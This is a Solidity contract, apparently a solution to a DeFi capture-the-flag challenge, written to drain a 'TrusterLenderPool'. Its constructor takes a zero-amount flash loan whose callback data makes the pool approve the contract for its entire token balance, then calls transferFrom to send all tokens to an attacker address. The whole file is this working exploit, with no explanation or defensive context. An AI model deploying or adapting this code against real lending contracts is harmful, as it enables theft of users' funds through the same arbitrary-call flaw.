// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract TrustedLenderPoolHacker {
	constructor (address _pool, address _token, address attacker, uint256 totalTokensInPool) {
		// _pool.call(abi.encodeWithSignature("flashLoan(uint256,address,address,bytes calldata)", 0, address(this), _token, abi.encodeWithSignature("approve(address,uint256)", address(this), totalTokensInPool)));

		ITrusterLenderPool(_pool).flashLoan(0, address(this), _token, abi.encodeWithSignature("approve(address,uint256)", address(this), totalTokensInPool));
		(bool success) = IERC20(_token).transferFrom(_pool, attacker, totalTokensInPool);
		require(success, "transfer unsuccessful");
	}
}